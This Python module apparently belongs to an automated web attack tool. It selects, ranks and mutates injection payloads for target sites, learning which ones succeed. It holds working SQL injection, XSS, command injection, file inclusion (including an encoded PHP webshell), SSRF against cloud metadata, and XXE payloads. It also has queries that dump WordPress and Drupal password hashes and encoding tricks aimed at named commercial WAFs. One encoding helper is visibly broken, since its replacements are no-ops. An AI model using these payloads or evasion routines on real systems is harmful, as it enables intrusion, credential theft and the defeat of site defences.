"""
ai/payload_optimizer.py - Payload Optimization Engine

Optimizes payload selection and generation based on:
- Target technology fingerprinting
- Historical success rates
- WAF/IDS evasion patterns
- Context-aware payload adaptation

This module enhances the existing payload generation by adding
intelligent payload selection and optimization.
"""

import json
import os
import logging
import re
import time
from typing import Dict, List, Any, Optional, Tuple, Set
from collections import defaultdict
from dataclasses import dataclass, field

logger = logging.getLogger("recon.payload_optimizer")


@dataclass
class PayloadStats:
    """Statistics for a payload pattern."""
    payload: str
    category: str
    success_count: int = 0
    failure_count: int = 0
    avg_confidence: float = 0.0
    waf_bypass_rate: float = 0.0
    last_used: float = 0.0
    
    @property
    def success_rate(self) -> float:
        total = self.success_count + self.failure_count
        return self.success_count / total if total > 0 else 0.0
    
    @property
    def score(self) -> float:
        """Calculate payload score based on multiple factors."""
        return (
            self.success_rate * 0.4 +
            self.waf_bypass_rate * 0.3 +
            min(1.0, self.success_count / 10) * 0.2 +
            0.1  # Base score
        )


class PayloadOptimizer:
    """
    Optimizes payload selection and generation.
    Learns from historical data and adapts to target context.
    """
    
    def __init__(self, state_manager=None, output_dir: str = "."):
        self.state = state_manager
        self.output_dir = output_dir
        self.stats_file = os.path.join(output_dir, "payload_stats.json")
        
        # Payload statistics tracking
        self.payload_stats: Dict[str, PayloadStats] = {}
        
        # Technology-specific payload mappings
        self.tech_payloads = self._load_tech_payloads()
        
        # WAF-specific bypass patterns
        self.waf_bypass_patterns = self._load_waf_bypass_patterns()
        
        # Load historical stats
        self._load_stats()
    
    def optimize_payloads(self, payloads: List[str], context: Dict[str, Any]) -> List[str]:
        """
        Optimize a list of payloads based on target context.
        
        Args:
            payloads: Original payload list
            context: Target context including tech stack, WAF, etc.
            
        Returns:
            Optimized and ranked payload list
        """
        if not payloads:
            return []
        
        tech_stack = context.get("technologies", {})
        waf_detected = context.get("waf", None)
        category = context.get("category", "general")
        
        optimized = []
        
        for payload in payloads:
            # Calculate base score from historical data
            stat = self.payload_stats.get(payload)
            base_score = stat.score if stat else 0.5
            
            # Apply tech-specific bonuses
            tech_bonus = self._calculate_tech_bonus(payload, tech_stack, category)
            
            # Apply WAF bypass bonus
            waf_bonus = self._calculate_waf_bonus(payload, waf_detected)
            
            # Calculate final score
            final_score = min(1.0, base_score * 0.5 + tech_bonus * 0.3 + waf_bonus * 0.2)
            
            optimized.append({
                "payload": payload,
                "score": final_score,
                "tech_bonus": tech_bonus,
                "waf_bonus": waf_bonus
            })
        
        # Sort by score descending
        optimized.sort(key=lambda x: x["score"], reverse=True)
        
        # Return top payloads (limit to reasonable number)
        return [p["payload"] for p in optimized[:20]]
    
    def generate_optimized_payloads(self, category: str, context: Dict[str, Any], count: int = 10) -> List[str]:
        """
        Generate optimized payloads for a specific category and context.
        
        Args:
            category: Vulnerability category (sql_injection, xss, etc.)
            context: Target context
            count: Number of payloads to generate
            
        Returns:
            Optimized payload list
        """
        # Get base payloads for category
        base_payloads = self._get_base_payloads(category)
        
        # Get tech-specific payloads
        tech_payloads = self._get_tech_specific_payloads(category, context.get("technologies", {}))
        
        # Get WAF bypass variants
        waf_payloads = self._get_waf_bypass_payloads(
            base_payloads, 
            context.get("waf", None)
        )
        
        # Combine and deduplicate
        all_payloads = list(set(base_payloads + tech_payloads + waf_payloads))
        
        # Optimize
        return self.optimize_payloads(all_payloads, context)[:count]
    
    def record_result(self, payload: str, category: str, success: bool, 
                     confidence: float = 0.0, waf_bypassed: bool = False):
        """
        Record payload execution result for learning.
        
        Args:
            payload: The payload that was tested
            category: Vulnerability category
            success: Whether the payload was successful
            confidence: Confidence score of the detection
            waf_bypassed: Whether WAF was bypassed
        """
        if payload not in self.payload_stats:
            self.payload_stats[payload] = PayloadStats(
                payload=payload,
                category=category
            )
        
        stat = self.payload_stats[payload]
        
        if success:
            stat.success_count += 1
        else:
            stat.failure_count += 1
        
        # Update average confidence
        total = stat.success_count + stat.failure_count
        stat.avg_confidence = (
            (stat.avg_confidence * (total - 1) + confidence) / total
        )
        
        # Update WAF bypass rate
        if waf_bypassed:
            stat.waf_bypass_rate = min(1.0, stat.waf_bypass_rate + 0.1)
        
        stat.last_used = time.time()
        
        # Save stats periodically
        if total % 10 == 0:
            self._save_stats()
    
    def get_recommendations(self, category: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Get payload recommendations based on historical data.
        
        Args:
            category: Vulnerability category
            context: Target context
            
        Returns:
            List of recommended payloads with metadata
        """
        recommendations = []
        
        # Get payloads for this category
        category_payloads = [
            (p, s) for p, s in self.payload_stats.items()
            if s.category == category
        ]
        
        # Sort by score
        category_payloads.sort(key=lambda x: x[1].score, reverse=True)
        
        for payload, stat in category_payloads[:10]:
            rec = {
                "payload": payload,
                "score": stat.score,
                "success_rate": stat.success_rate,
                "success_count": stat.success_count,
                "waf_bypass_rate": stat.waf_bypass_rate,
                "recommendation_reason": self._get_recommendation_reason(stat, context)
            }
            recommendations.append(rec)
        
        return recommendations
    
    def _get_base_payloads(self, category: str) -> List[str]:
        """Get base payloads for a vulnerability category."""
        base_payloads = {
            "sql_injection": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' AND (SELECT COUNT(*) FROM users)>0--",
                "' WAITFOR DELAY '0:0:5'--",
                "' AND SLEEP(5)--",
                "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                "1 OR 1=1",
                "1 OR 1=1#",
                "1' OR '1'='1' /*",
                "-1 OR 1=1",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "'\"><svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src=\"javascript:alert('XSS')\">",
                "\"'><marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<video><source onerror=\"alert('XSS')\">",
            ],
            "command_injection": [
                "; whoami",
                "| id",
                "&& whoami",
                "`whoami`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| ls -la",
                "&& cat /etc/shadow",
                "; uname -a",
                "| ps aux",
                "${IFS}whoami",
                "`cat /etc/passwd`",
            ],
            "file_inclusion": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "file:///etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                "expect://whoami",
                "/proc/self/environ",
                "/proc/version",
                "/etc/passwd",
            ],
            "ssrf": [
                "http://127.0.0.1",
                "http://localhost",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/_HELO%20localhost",
                "dict://127.0.0.1:11211/_stats",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "file:///proc/self/fd/0",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/ssrf">]><foo>&xxe;</foo>',
            ],
        }
        
        return base_payloads.get(category, [])
    
    def _get_tech_specific_payloads(self, category: str, technologies: Dict[str, Any]) -> List[str]:
        """Get technology-specific payloads."""
        tech_payloads = []
        
        for tech_name, tech_info in technologies.items():
            version = tech_info.get("version", "") if isinstance(tech_info, dict) else ""
            
            # WordPress-specific
            if "wordpress" in tech_name.lower():
                if category == "sql_injection":
                    tech_payloads.extend([
                        "' AND (SELECT COUNT(*) FROM wp_users)>0--",
                        "' UNION SELECT NULL,user_login,user_pass FROM wp_users--",
                    ])
                elif category == "xss":
                    tech_payloads.extend([
                        "\"'><svg onload=alert('XSS')>//wp-content/",
                    ])
            
            # Drupal-specific
            elif "drupal" in tech_name.lower():
                if category == "sql_injection":
                    tech_payloads.extend([
                        "' AND (SELECT COUNT(*) FROM users)>0--",
                        "' UNION SELECT NULL,name,pass FROM users--",
                    ])
            
            # Joomla-specific
            elif "joomla" in tech_name.lower():
                if category == "sql_injection":
                    tech_payloads.extend([
                        "' AND (SELECT COUNT(*) FROM jos_users)>0--",
                    ])
            
            # PHP-specific
            elif "php" in tech_name.lower():
                if category == "command_injection":
                    tech_payloads.extend([
                        "; phpinfo(); ?>",
                        "| <?php system('whoami'); ?>",
                    ])
                elif category == "file_inclusion":
                    tech_payloads.extend([
                        "php://filter/convert.base64-encode/resource=index.php",
                    ])
            
            # ASP.NET-specific
            elif "asp" in tech_name.lower() or "aspx" in tech_name.lower():
                if category == "sql_injection":
                    tech_payloads.extend([
                        "' HAVING 1=1--",
                        "' GROUP BY columnnames HAVING 1=1--",
                        "' ORDER BY 1--",
                    ])
        
        return tech_payloads
    
    def _get_waf_bypass_payloads(self, payloads: List[str], waf: Optional[str]) -> List[str]:
        """Get WAF bypass variants of payloads."""
        if not waf:
            return []
        
        bypass_payloads = []
        waf_lower = waf.lower()
        
        for payload in payloads[:5]:  # Limit to avoid explosion
            # Get bypass patterns for this WAF
            patterns = self.waf_bypass_patterns.get(waf_lower, 
                self.waf_bypass_patterns.get("generic", []))
            
            for pattern_func_name in patterns:
                try:
                    bypass = self._apply_bypass_pattern(payload, pattern_func_name)
                    if bypass and bypass != payload:
                        bypass_payloads.append(bypass)
                except Exception as e:
                    logger.debug(f"[PAYLOAD_OPT] Bypass pattern failed: {e}")
        
        return bypass_payloads
    
    def _apply_bypass_pattern(self, payload: str, pattern_name: str) -> Optional[str]:
        """Apply a specific bypass pattern to a payload."""
        patterns = {
            "uppercase": lambda p: p.upper(),
            "lowercase": lambda p: p.lower(),
            "url_encode": lambda p: self._url_encode(p),
            "double_url_encode": lambda p: self._url_encode(self._url_encode(p)),
            "html_encode": lambda p: self._html_encode(p),
            "unicode_encode": lambda p: self._unicode_encode(p),
            "comment_insert": lambda p: self._insert_comments(p),
            "whitespace_replace": lambda p: p.replace(" ", "/**/"),
            "tab_replace": lambda p: p.replace(" ", "\t"),
            "newline_replace": lambda p: p.replace(" ", "\n"),
            "char_encode": lambda p: self._char_encode(p),
            "concatenation": lambda p: self._add_concatenation(p),
        }
        
        if pattern_name in patterns:
            return patterns[pattern_name](payload)
        return None
    
    def _url_encode(self, payload: str) -> str:
        """URL encode payload."""
        import urllib.parse
        return urllib.parse.quote(payload, safe='')
    
    def _html_encode(self, payload: str) -> str:
        """HTML entity encode payload."""
        replacements = {
            '<': '<',
            '>': '>',
            '"': '"',
            "'": '&#x27;',
            '&': '&',
        }
        for old, new in replacements.items():
            payload = payload.replace(old, new)
        return payload
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload."""
        result = []
        for char in payload:
            if ord(char) > 127:
                result.append(f"\\u{ord(char):04x}")
            else:
                result.append(char)
        return ''.join(result)
    
    def _insert_comments(self, payload: str) -> str:
        """Insert SQL comments into payload."""
        # Insert comments around keywords
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        for kw in keywords:
            result = result.replace(kw, f"/*{kw}*/")
            result = result.replace(kw.lower(), f"/*{kw.lower()}*/")
        return result
    
    def _char_encode(self, payload: str) -> str:
        """Character encoding bypass."""
        result = []
        for char in payload:
            if char.isalpha():
                result.append(f"CHAR({ord(char)})")
            else:
                result.append(char)
        return ''.join(result)
    
    def _add_concatenation(self, payload: str) -> str:
        """Add string concatenation."""
        # Replace spaces with concatenation
        return payload.replace(" ", "','")
    
    def _calculate_tech_bonus(self, payload: str, tech_stack: Dict[str, Any], category: str) -> float:
        """Calculate tech-specific bonus for payload."""
        bonus = 0.0
        
        # Check if payload is tech-specific
        tech_names = [name.lower() for name in tech_stack.keys()]
        
        # WordPress bonus
        if any('wordpress' in t or 'wp' in t for t in tech_names):
            if 'wp_' in payload.lower() or 'wordpress' in payload.lower():
                bonus += 0.3
        
        # Drupal bonus
        if any('drupal' in t for t in tech_names):
            if 'users' in payload.lower() and 'jos_' not in payload.lower():
                bonus += 0.2
        
        # Joomla bonus
        if any('joomla' in t for t in tech_names):
            if 'jos_' in payload.lower():
                bonus += 0.3
        
        return min(bonus, 1.0)
    
    def _calculate_waf_bonus(self, payload: str, waf: Optional[str]) -> float:
        """Calculate WAF bypass bonus for payload."""
        if not waf:
            return 0.5  # Neutral score when no WAF
        
        # Check if payload has bypass characteristics
        bypass_indicators = [
            payload != payload.upper() and payload != payload.lower(),  # Mixed case
            '%' in payload,  # URL encoded
            '&#' in payload,  # HTML encoded
            '/**/' in payload,  # Comment insertion
            'CHAR(' in payload.upper(),  # Char encoding
        ]
        
        bypass_count = sum(1 for indicator in bypass_indicators if indicator)
        return min(bypass_count / len(bypass_indicators), 1.0)
    
    def _get_recommendation_reason(self, stat: PayloadStats, context: Dict[str, Any]) -> str:
        """Generate human-readable recommendation reason."""
        reasons = []
        
        if stat.success_rate > 0.8:
            reasons.append(f"High success rate ({stat.success_rate:.0%})")
        elif stat.success_rate > 0.5:
            reasons.append(f"Moderate success rate ({stat.success_rate:.0%})")
        
        if stat.waf_bypass_rate > 0.7:
            reasons.append("Good WAF bypass capability")
        
        if stat.success_count > 20:
            reasons.append(f"Tested {stat.success_count} times")
        
        if context.get("waf"):
            reasons.append(f"Optimized for {context['waf']}")
        
        return "; ".join(reasons) if reasons else "Default recommendation"
    
    def _load_tech_payloads(self) -> Dict[str, List[str]]:
        """Load technology-specific payload mappings."""
        return {
            "wordpress": ["wp_", "wordpress", "wp-admin", "wp-content"],
            "drupal": ["users", "node/", "drupal"],
            "joomla": ["jos_", "joomla", "index.php"],
            "magento": ["mage_", "magento", "catalog"],
            "shopify": ["shopify", "collections", "products"],
        }
    
    def _load_waf_bypass_patterns(self) -> Dict[str, List[str]]:
        """Load WAF-specific bypass patterns."""
        return {
            "cloudflare": ["uppercase", "comment_insert", "whitespace_replace"],
            "modsecurity": ["url_encode", "double_url_encode", "html_encode"],
            "wordfence": ["unicode_encode", "char_encode", "concatenation"],
            "akamai": ["uppercase", "url_encode", "comment_insert"],
            "sucuri": ["html_encode", "unicode_encode", "whitespace_replace"],
            "generic": ["uppercase", "url_encode", "comment_insert", "whitespace_replace"],
        }
    
    def _load_stats(self):
        """Load historical payload statistics."""
        try:
            if os.path.exists(self.stats_file):
                with open(self.stats_file, 'r') as f:
                    data = json.load(f)
                for payload_str, stats_data in data.items():
                    self.payload_stats[payload_str] = PayloadStats(
                        payload=payload_str,
                        category=stats_data.get('category', 'general'),
                        success_count=stats_data.get('success_count', 0),
                        failure_count=stats_data.get('failure_count', 0),
                        avg_confidence=stats_data.get('avg_confidence', 0.0),
                        waf_bypass_rate=stats_data.get('waf_bypass_rate', 0.0),
                        last_used=stats_data.get('last_used', 0.0)
                    )
                logger.debug(f"[PAYLOAD_OPT] Loaded {len(self.payload_stats)} payload stats")
        except Exception as e:
            logger.debug(f"[PAYLOAD_OPT] Failed to load stats: {e}")
    
    def _save_stats(self):
        """Save payload statistics to file."""
        try:
            data = {}
            for payload, stat in self.payload_stats.items():
                data[payload] = {
                    'category': stat.category,
                    'success_count': stat.success_count,
                    'failure_count': stat.failure_count,
                    'avg_confidence': stat.avg_confidence,
                    'waf_bypass_rate': stat.waf_bypass_rate,
                    'last_used': stat.last_used
                }
            
            with open(self.stats_file, 'w') as f:
                json.dump(data, f, indent=2)
            logger.debug(f"[PAYLOAD_OPT] Saved {len(self.payload_stats)} payload stats")
        except Exception as e:
            logger.error(f"[PAYLOAD_OPT] Failed to save stats: {e}")
    
    def get_top_payloads(self, category: str, count: int = 10) -> List[Dict[str, Any]]:
        """Get top payloads for a category based on historical performance."""
        category_payloads = [
            (p, s) for p, s in self.payload_stats.items()
            if s.category == category
        ]
        
        # Sort by score
        category_payloads.sort(key=lambda x: x[1].score, reverse=True)
        
        return [
            {
                "payload": p,
                "score": s.score,
                "success_rate": s.success_rate,
                "success_count": s.success_count,
            }
            for p, s in category_payloads[:count]
        ]